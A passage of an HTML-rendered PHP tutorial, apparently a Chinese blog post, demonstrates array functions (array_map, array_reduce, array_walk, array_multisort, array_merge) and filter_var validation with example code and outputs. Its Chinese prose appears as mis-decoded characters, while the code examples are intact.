ARRAY_FILTER_USE_BOTH</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">print_r($fireList);</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šç”¨æˆ·ä¸åº”åœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹æ•°ç»„æœ¬èº«ã€‚ä¾‹å¦‚å¢åŠ ï¼åˆ é™¤å•å…ƒæˆ–è€…å¯¹ <code>array_filter()</code> æ­£åœ¨ä½œç”¨çš„æ•°ç»„è¿›è¡Œ <code>unset</code>ã€‚å¦‚æœæ•°ç»„æ”¹å˜äº†ï¼Œæ­¤å‡½æ•°çš„è¡Œä¸ºå°†ä¸å¯é¢„æµ‹ã€‚</p></blockquote><h2 id="2-array-map"><a href="#2-array-map" class="headerlink" title="2. array_map"></a>2. array_map</h2><p>é€šè¿‡<code>array_map()</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„è®¾çš„å‡½æ•°å¯¹æ•°ç»„å…ƒç´ è¿›è¡Œæ‰¹é‡å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span><span class="params">($n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>($n * $n * $n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">$b = array_map(<span class="string">"cube"</span>, $a);</span><br><span class="line">print_r($b);</span><br></pre></td></tr></table></figure><p><code>$b</code> å°†è¾“å‡º</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">8</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">27</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">64</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">125</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ä»PHP 5.3èµ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†è°ƒç”¨çš„å‡½æ•°å†™ä½œé—­åŒ…çš„å½¢å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b = array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>($n * $n * $n);</span><br><span class="line">    &#125;, </span><br><span class="line">    $a</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå†…ç½®çš„å‡½æ•°æ¥å¤„ç†ä¸€äº›æ•°æ®ï¼Œå¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$values = [<span class="string">'say'</span>, <span class="string">'  bye'</span>, <span class="string">''</span>, <span class="string">' to'</span>, <span class="string">' spaces  '</span>, <span class="string">'    '</span>];</span><br><span class="line">$result = array_map(<span class="string">'trim'</span>, $values);</span><br></pre></td></tr></table></figure><p><code>array_map()</code>ä¹Ÿå¯ä»¥åœ¨ç±»ä¸­ä½¿ç”¨ï¼Œä»¥ä¸‹æ˜¯åœ¨ç±»ä¸­çš„è°ƒç”¨æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Static outside of class context</span></span><br><span class="line">array_map( <span class="keyword">array</span>( <span class="string">'ClassName'</span>, <span class="string">'methodName'</span> ), $array );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Static inside class context</span></span><br><span class="line">array_map( <span class="keyword">array</span>( <span class="keyword">__CLASS__</span>, <span class="string">'methodName'</span> ), $array );</span><br><span class="line">array_map( <span class="keyword">array</span>( <span class="string">'self'</span>, <span class="string">'methodName'</span> ), $array );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Non-static outside of object context</span></span><br><span class="line">array_map( <span class="keyword">array</span>( $object, <span class="string">'methodName'</span> ), $array );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Non-static inside of object context</span></span><br><span class="line">array_map( <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'methodName'</span> ), $array );</span><br></pre></td></tr></table></figure><h2 id="3-array-reduce"><a href="#3-array-reduce" class="headerlink" title="3. array_reduce"></a>3. array_reduce</h2><p>æ±‚ 1 ~ 100 çš„å’Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hunder = range(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">$sum = array_reduce(</span><br><span class="line">    $hunder,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($carry, $item)</span> </span>&#123;</span><br><span class="line">        $carry += $item;</span><br><span class="line">        <span class="keyword">return</span> $carry;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure><h2 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4. array_walk"></a>4. array_walk</h2><p><code>array_walk()</code>å¯ä»¥è®©æˆ‘ä»¬ä¾¿æ·çš„ä¿®æ”¹æ•°ç»„å†…çš„å…ƒç´ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$infos = [</span><br><span class="line">    [<span class="string">'uid'</span> =&gt; <span class="number">1</span>, <span class="string">'email'</span> =&gt; <span class="string">'jack@example.com'</span>],</span><br><span class="line">    [<span class="string">'uid'</span> =&gt; <span class="number">2</span>, <span class="string">'email'</span> =&gt; <span class="string">'rose@example.com'</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">array_walk(</span><br><span class="line">  $infos,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="params">(&amp;$info)</span> </span>&#123;</span><br><span class="line">      $info[<span class="string">'username'</span>] = strstr($info[<span class="string">'email'</span>], <span class="string">'@'</span>, <span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">unset</span>($info[<span class="string">'email'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($infos); <span class="comment">// [&#123;"uid":1,"username":"jack"&#125;,&#123;"uid":2,"username":"rose"&#125;]</span></span><br></pre></td></tr></table></figure><h2 id="5-array-walk-recursive"><a href="#5-array-walk-recursive" class="headerlink" title="5. array_walk_recursive"></a>5. array_walk_recursive</h2><p>æŠŠä»»æ„ç»´åº¦çš„æ•°ç»„è½¬æ¢æˆä¸€ç»´æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$user = [</span><br><span class="line">    <span class="string">'a'</span> =&gt; [<span class="number">100</span>, <span class="string">'a1'</span>],</span><br><span class="line">    <span class="string">'b'</span> =&gt; [<span class="number">101</span>, <span class="string">'a2'</span>],</span><br><span class="line">    <span class="string">'c'</span> =&gt; [</span><br><span class="line">        <span class="string">'d'</span> =&gt; [<span class="number">102</span>, <span class="string">'a3'</span>],</span><br><span class="line">        <span class="string">'e'</span> =&gt; [<span class="number">103</span>, <span class="string">'a4'</span>]</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_flat</span><span class="params">($arr)</span> </span>&#123;</span><br><span class="line">    $result = [];</span><br><span class="line">    array_walk_recursive($arr, <span class="function"><span class="keyword">function</span> <span class="params">($value)</span> <span class="title">use</span> <span class="params">(&amp;$result)</span> </span>&#123;</span><br><span class="line">        array_push($result, $value);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_r(array_flat($user));</span><br></pre></td></tr></table></figure><h2 id="6-filter-var"><a href="#6-filter-var" class="headerlink" title="6. filter_var"></a>6. filter_var</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éªŒè¯é‚®ç®±</span></span><br><span class="line">var_dump(filter_var(<span class="string">'username@example.com'</span>, FILTER_VALIDATE_EMAIL)); <span class="comment">// æœ‰æ•ˆè¾“å‡ºemailåœ°å€ï¼Œæ— æ•ˆè¾“å‡ºfalse</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ IPv4</span></span><br><span class="line">var_dump(filter_var(<span class="string">'8.8.8.8'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)); <span class="comment">// æœ‰æ•ˆè¾“å‡ºIPï¼Œæ— æ•ˆè¾“å‡ºfalse </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ IPv6</span></span><br><span class="line">var_dump(filter_var(<span class="string">'2001:4860:4860::8888'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)); <span class="comment">// æœ‰æ•ˆè¾“å‡ºIPï¼Œæ— æ•ˆè¾“å‡ºfalse </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯éç§ç½‘ IP</span></span><br><span class="line">var_dump(filter_var(<span class="string">'10.0.0.1'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)); <span class="comment">// éç§ç½‘è¾“å‡ºIPï¼Œå¦åˆ™è¾“å‡ºfalse</span></span><br><span class="line">var_dump(filter_var(<span class="string">'192.0.0.1'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE));</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯éä¿ç•™ IP</span></span><br><span class="line">var_dump(filter_var(<span class="string">'8.8.8.8'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE)); <span class="comment">// // éä¿ç•™IPè¾“å‡ºIPï¼Œå¦åˆ™è¾“å‡ºfalse</span></span><br><span class="line">var_dump(filter_var(<span class="string">'127.0.0.1'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line">var_dump(filter_var(<span class="string">'0.0.0.0'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line">var_dump(filter_var(<span class="string">'169.254.0.0'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line">var_dump(filter_var(<span class="string">'255.255.255.255'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line">var_dump(filter_var(<span class="string">'::1'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line">var_dump(filter_var(<span class="string">'2002'</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE));</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ Mac åœ°å€</span></span><br><span class="line">var_dump(filter_var(<span class="string">'F1:5C:89:A4:40:49'</span>, FILTER_VALIDATE_MAC)); <span class="comment">// æœ‰æ•ˆè¾“å‡ºåœ°å€ï¼Œæ— æ•ˆè¾“å‡º false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯å¸ƒå°”å€¼</span></span><br><span class="line">var_dump(filter_var(<span class="string">'1'</span>, FILTER_VALIDATE_BOOLEAN)); <span class="comment">// 1, true, on ,yes è¿”å› trueï¼Œå¦åˆ™è¿”å› false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯æµ®ç‚¹æ•°</span></span><br><span class="line">var_dump(filter_var(<span class="string">'1234.233'</span>, FILTER_VALIDATE_FLOAT)); <span class="comment">// æœ‰æ•ˆè¾“å‡ºæµ®ç‚¹æ•°ï¼Œæ— æ•ˆè¾“å‡º false</span></span><br><span class="line">var_dump(filter_var(<span class="string">'1,234.233'</span>, FILTER_VALIDATE_FLOAT, FILTER_FLAG_ALLOW_THOUSAND));</span><br></pre></td></tr></table></figure><h2 id="7-array-multisort"><a href="#7-array-multisort" class="headerlink" title="7. array_multisort"></a>7. array_multisort</h2><p>é€šè¿‡<code>array_multisort()</code>ï¼Œå¯ä»¥è®©æˆ‘ä»¬åƒæ“ä½œ Excel ä¸€æ ·å¯¹æ•°æ®è¿›è¡Œæ’åºæ“ä½œï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­</p><h3 id="7-1-å¤šä¸ªæ•°ç»„æ’åº"><a href="#7-1-å¤šä¸ªæ•°ç»„æ’åº" class="headerlink" title="7.1 å¤šä¸ªæ•°ç»„æ’åº"></a>7.1 å¤šä¸ªæ•°ç»„æ’åº</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ar1 = <span class="keyword">array</span>(<span class="number">10</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">$ar2 = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">array_multisort($ar1, $ar2);</span><br><span class="line"></span><br><span class="line">var_dump($ar1);</span><br><span class="line">var_dump($ar2);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­é‡Œï¼Œæ’åºåï¼Œç¬¬ä¸€ä¸ªæ•°ç»„ä¼šåŒ…å« 0ã€ 10ã€ 100ã€ 100ã€‚ ç¬¬äºŒä¸ªæ•°ç»„ä¼šåŒ…å« 4ã€1ã€ 2ã€ 3ã€‚ ç¬¬äºŒä¸ªæ•°ç»„é‡Œçš„é¡¹ç›®å¯¹åº”ç¬¬ä¸€ä¸ªæ•°ç»„åä¹Ÿè¿›è¡Œäº†æ’åºï¼ˆ100 å’Œ 100ï¼‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt; int(<span class="number">0</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt; int(<span class="number">10</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt; int(<span class="number">100</span>)</span><br><span class="line">  [<span class="number">3</span>]=&gt; int(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt; int(<span class="number">4</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt; int(<span class="number">1</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt; int(<span class="number">2</span>)</span><br><span class="line">  [<span class="number">3</span>]=&gt; int(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-å¯¹æ•°æ®åº“ç»“æœè¿›è¡Œæ’åº"><a href="#7-2-å¯¹æ•°æ®åº“ç»“æœè¿›è¡Œæ’åº" class="headerlink" title="7.2 å¯¹æ•°æ®åº“ç»“æœè¿›è¡Œæ’åº"></a>7.2 å¯¹æ•°æ®åº“ç»“æœè¿›è¡Œæ’åº</h3><p>ç°åœ¨æ•°æ®è¡¨ä¸­å­˜å‚¨ç€å¦‚ä¸‹çš„æ•°æ®:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">volume | edition</span><br><span class="line">-------+--------</span><br><span class="line">    <span class="number">67</span> |       <span class="number">2</span></span><br><span class="line">    <span class="number">86</span> |       <span class="number">1</span></span><br><span class="line">    <span class="number">85</span> |       <span class="number">6</span></span><br><span class="line">    <span class="number">98</span> |       <span class="number">2</span></span><br><span class="line">    <span class="number">86</span> |       <span class="number">6</span></span><br><span class="line">    <span class="number">67</span> |       <span class="number">7</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† volume é™åºæ’åˆ—ï¼ŒæŠŠ edition å‡åºæ’åˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">67</span>, <span class="string">'edition'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">86</span>, <span class="string">'edition'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">85</span>, <span class="string">'edition'</span> =&gt; <span class="number">6</span>],</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">98</span>, <span class="string">'edition'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">86</span>, <span class="string">'edition'</span> =&gt; <span class="number">6</span>],</span><br><span class="line">    [<span class="string">'volume'</span> =&gt; <span class="number">67</span>, <span class="string">'edition'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// å–å¾—åˆ—çš„åˆ—è¡¨</span></span><br><span class="line">$volume = array_column($data, <span class="string">'volume'</span>);</span><br><span class="line">$edition = array_column($data, <span class="string">'edition'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ•°æ®æ ¹æ® volume é™åºæ’åˆ—ï¼Œæ ¹æ® edition å‡åºæ’åˆ—</span></span><br><span class="line"><span class="comment">// æŠŠ $data ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œä»¥é€šç”¨é”®æ’åº</span></span><br><span class="line">array_multisort($volume, SORT_DESC, $edition, SORT_ASC, $data);</span><br></pre></td></tr></table></figure><p>æ•°æ®é›†åˆç°åœ¨æ’å¥½åºäº†ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">volume | edition</span><br><span class="line">-------+--------</span><br><span class="line">    <span class="number">98</span> |       <span class="number">2</span></span><br><span class="line">    <span class="number">86</span> |       <span class="number">1</span></span><br><span class="line">    <span class="number">86</span> |       <span class="number">6</span></span><br><span class="line">    <span class="number">85</span> |       <span class="number">6</span></span><br><span class="line">    <span class="number">67</span> |       <span class="number">2</span></span><br><span class="line">    <span class="number">67</span> |       <span class="number">7</span></span><br></pre></td></tr></table></figure><h2 id="8-array-merge"><a href="#8-array-merge" class="headerlink" title="8. array_merge"></a>8. array_merge</h2><p>è¿™ä¸ªåº”è¯¥éƒ½å¾ˆç†Ÿæ‚‰ï¼Œå°±æ˜¯å°†ä¸¤ä¸ªæ•°ç»„åˆå¹¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array1 = <span class="keyword">array</span>(<span class="string">"color"</span> =&gt; <span class="string">"red"</span>, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"color"</span> =&gt; <span class="string">"green"</span>, <span class="string">"shape"</span> =&gt; <span class="string">"trapezoid"</span>, <span class="number">4</span>);</span><br><span class="line">print_r(array_merge($array1, $array2));</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [color] =&gt; green</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; a</span><br><span class="line">    [<span class="number">3</span>] =&gt; b</span><br><span class="line">    [shape] =&gt; trapezoid</span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>âš ï¸ï¼šå¦‚æœåˆå¹¶çš„æ•°ç»„ä¸­åŒ…å«äº†å…³è”æ•°ç»„ï¼Œåˆ™ç›¸åŒé”®åå…ƒç´ ä¼šè¦†ç›–ï¼Œä¸”åˆå¹¶åçš„æ•°ç»„ä¿ç•™åŸé”®åã€‚è‹¥æ˜¯ç´¢å¼•æ•°ç»„ï¼Œåˆ™ä¼šé‡æ–°ç”Ÿæˆç´¢å¼•ã€‚</p></blockquote><p>åŒåå…³è”æ•°ç»„è¢«è¦†ç›–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array1 = <span class="keyword">array</span>(<span class="string">"color"</span> =&gt; <span class="string">"red"</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="string">"color"</span> =&gt; <span class="string">"green"</span>, <span class="string">"shape"</span> =&gt; <span class="string">"trapezoid"</span>);</span><br><span class="line">print_r(array_merge($array1, $array2));</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="built_in">color</span>] =&gt; <span class="built_in">green</span></span><br><span class="line">    [<span class="built_in">shape</span>] =&gt; trapezoid</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>åŒåç´¢å¼•æ•°ç»„é‡æ–°ç´¢å¼•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array1 = <span class="keyword">array</span>(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="number">4</span>);</span><br><span class="line">print_r(array_merge($array1, $array2));</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; a</span><br><span class="line">    [<span class="number">3</span>] =&gt; b</span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§åˆå¹¶æ•°ç»„çš„æ–¹å¼ï¼š<code>+</code>è¿ç®—ç¬¦ï¼Œè¿™ç§æ–¹å¼å¯ä»¥å®Œå…¨ä¿ç•™åŸæœ‰æ•°ç»„å¹¶å°†æ–°çš„æ•°ç»„é™„åŠ åˆ°åé¢ã€‚<strong>åœ¨ä¸¤ä¸ªæ•°ç»„ä¸­å­˜åœ¨ç›¸åŒçš„é”®åæ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°ç»„ä¸­çš„åŒé”®åçš„å…ƒç´ å°†ä¼šè¢«ä¿ç•™ï¼Œç¬¬äºŒä¸ªæ•°ç»„ä¸­çš„å…ƒç´ å°†ä¼šè¢«å¿½ç•¥</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$array1 = <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="string">'zero_a'</span>, <span class="number">2</span> =&gt; <span class="string">'two_a'</span>, <span class="number">3</span> =&gt; <span class="string">'three_a'</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="string">'one_b'</span>, <span class="number">3</span> =&gt; <span class="string">'three_b'</span>, <span class="number">4</span> =&gt; <span class="string">'four_b'</span>);</span><br><span class="line">$result = $array1 + $array2;</span><br><span class="line">print_r($result);</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; zero_a</span><br><span class="line">    [<span class="number">2</span>] =&gt; two_a</span><br><span class="line">    [<span class="number">3</span>] =&gt; three_a</span><br><span class="line">    [<span class="number">1</span>] =&gt; one_b</span><br><span class="line">    [<span class="number">4</span>] =&gt; four_b</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="9-array-merge-recursive"><a href="#9-array-merge-recursive" class="headerlink" title="9. array_merge_recursive"></a>9. array_merge_recursive</h2><p>å°†ç›¸åŒ <code>key</code>çš„ä¸åŒæ•°ç»„ä¸­ä¿¡æ¯è¿›è¡Œåˆå¹¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 